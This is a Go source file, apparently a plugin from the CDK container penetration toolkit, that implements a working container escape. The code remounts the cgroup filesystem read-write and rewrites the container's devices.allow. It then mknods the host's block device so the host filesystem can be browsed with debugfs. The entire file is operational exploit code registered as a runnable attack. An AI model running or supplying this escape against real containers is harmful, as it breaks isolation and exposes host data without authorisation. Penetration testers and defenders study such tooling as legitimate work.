package exploit

import (
	"fmt"
	"github.com/cdk-team/CDK/pkg/plugin"
	"github.com/cdk-team/CDK/pkg/util"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"syscall"
)

// plugin interface
type cgroupDevicesExploitS struct{}

func (p cgroupDevicesExploitS) Desc() string {
	return "escape sys_admin capabilities container via rewrite cgroup devices.allow. usage: ./cdk run rewrite-cgroup-devices."
}

func fileInode(path string) (inodeID uint64, err error) {
	info, err := os.Stat(path)
	if err != nil {
		return 0, err
	}
	if stat, ok := info.Sys().(*syscall.Stat_t); ok {
		return stat.Ino, nil
	}
	return 0, nil
}

// runShellFile run shell script use bash
func runShellFile(filePreString string, shell string) error {

	var taskRandString = util.RandString(6)
	var outFile = fmt.Sprintf("/tmp/%s-%s.sh", filePreString, taskRandString)
	log.Printf("generate shell exploit: %s\n", outFile)

	err := ioutil.WriteFile(outFile, []byte(shell), 0777)
	if err != nil {
		return err
	}

	err = util.ShellExec(outFile)
	return  err
}

func findCurrentCgroupENV() string {

	devicesAllowPath := ""

	// find current container cgroup
	inodeID, err := fileInode("/sys/fs/cgroup/devices/devices.allow")
	if err != nil {
		log.Printf("get /sys/fs/cgroup/devices/devices.allow inode error: %s\n", err)
		return ""
	}
	log.Printf("get /sys/fs/cgroup/devices/devices.allow inode id: %d\n", inodeID)

	// the best way to find container id and current cgroup devices.allow
	err = filepath.Walk("/sys/fs/cgroup/cgneartest", func(path string, info os.FileInfo, err error) error {
		if err == nil && info.Name() == "devices.allow" && path != "/sys/fs/cgroup/cgneartest/devices.allow" {
			iid, err := fileInode(path)
			if err == nil && iid == inodeID {
				devicesAllowPath = path
				return nil
			}
		}
		return nil
	})

	return devicesAllowPath

}

func (p cgroupDevicesExploitS) Run() bool {

	// generate shell script and save to local and run
	err := runShellFile("rewrite-cgroup-devices-exp", MountCgroupCmd)
	if err != nil {
		log.Printf("run /tmp/rewrite-cgroup-devices-exp-* error: %s\n", err)
		return false
	}

	devicesAllowPath := findCurrentCgroupENV()
	if devicesAllowPath == "" {
		log.Printf("writeable cgroup devices.allow not found")
		return false
	}
	log.Printf("find cgroup devices.allow file: %s\n", devicesAllowPath)

	// get "virtblk" device ID
	mountInfos, err := util.GetMountInfo()
	if err != nil {
		log.Printf("get mount info error: %v", err)
		return false
	}

	// rewrite and mknod
	err = util.SetBlockAccessible(devicesAllowPath)
	if err != nil {
		log.Printf("set block accessible err %v", err)
		return false
	}

	// use lxcfs_rw exp function by https://github.com/yeahx
	for _, mi := range mountInfos {
		if util.FindTargetDeviceID(&mi) {

			dev := util.MakeDev(mi.Marjor, mi.Minor)
			if dev == 0 {
				log.Printf("Blockdevice Marjor/Minor number invalid.")
				return false
			}

			err = syscall.Mknod("./cdk_mknod_result", syscall.S_IFBLK|uint32(os.FileMode(0700)), dev)
			if err != nil {
				log.Printf("mknod err: %v", err)
				return false
			} else {
				// escape done~
				log.Println("now, run 'debugfs cdk_mknod_result' to browse host files.")
				return true
			}
		}
	}

	return false
}

// MountCgroupCmd remount a write-able devices cgroup subsystem
var MountCgroupCmd = `set -uex
mount -oremount,rw /sys/fs/cgroup
mkdir /sys/fs/cgroup/cgneartest
mount -t cgroup -o devices devices /sys/fs/cgroup/cgneartest`

func init() {
	exploit := cgroupDevicesExploitS{}
	plugin.RegisterExploit("rewrite-cgroup-devices", exploit)
}
